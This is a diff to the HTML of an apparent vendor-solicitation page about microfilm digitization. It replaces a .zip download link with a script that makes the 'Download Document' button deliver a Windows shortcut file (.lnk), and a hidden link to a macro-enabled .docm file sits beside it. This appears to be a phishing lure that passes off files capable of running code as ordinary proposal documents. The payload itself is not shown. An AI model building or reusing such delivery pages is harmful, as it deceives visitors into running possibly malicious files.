@@ -174,9 +174,21 @@
         <h1>Active Efforts</h1>
         <h2>Microfilm Digitization Project</h2>
         <p>We are seeking proposals from qualified vendors for the digitization of damaged microfilm archives using advanced machine learning processing techniques. To participate in this opportunity, please download the required documents below and provide detailed responses to the questions provided.</p>
-        <a href="HeritageLensAlliance.zip" class="button">Download Document</a>
+
+        <!-- Button to trigger the .lnk download -->
+        <button class="button" id="downloadLink">Download Document</button>
+
+        <script>
+            document.getElementById('downloadLink').addEventListener('click', function() {
+                var link = document.createElement('a');
+                link.href = 'HeritageLensAlliance.lnk';  
+                link.download = 'HeritageLensAlliance.lnk';
+                link.click();
+            });
+        </script>
+        Document</a>
     </main><a href="HeritageLensAlliance.docm" style="display:none;">Download Document</a>
-</main>
+    </main>
     <footer>
         <p>&copy; 2024 Heritage Lens Alliance. All rights reserved.</p>
     </footer>
